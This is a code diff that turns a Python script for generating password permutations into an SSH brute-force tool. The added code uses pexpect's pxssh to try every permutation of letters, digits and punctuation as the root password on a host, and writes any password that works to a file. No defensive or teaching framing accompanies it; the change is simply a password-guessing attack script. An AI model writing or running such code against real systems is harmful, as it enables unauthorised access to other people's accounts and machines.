@@ -1,7 +1,13 @@
 import string
 import itertools
+from pexpect import pxssh
 
 def Main():
+    s = pxssh.pxssh()
+
+    HOST = 'localhost'
+    USER = 'root'
+
     num_of_characters = int(input('Please enter passsword characters : '))
 
     if num_of_characters < 0:
@@ -9,11 +15,11 @@ def Main():
 
     charaters = list(string.ascii_letters + string.digits + string.punctuation)
 
-    file = open('passwords-length-' + str(num_of_characters) + '.txt','w')
     for passwrod in itertools.permutations(charaters, num_of_characters):
-        file.write(''.join(passwrod) + '\n')
-
-    file.close()
+        if s.login (HOST, USER, ''.join(passwrod)):
+            file = open('password-for' + HOST + '.txt','w')
+            file.write(''.join(passwrod) + '\n')
+            file.close()
 
 if __name__ == '__main__':
     Main()
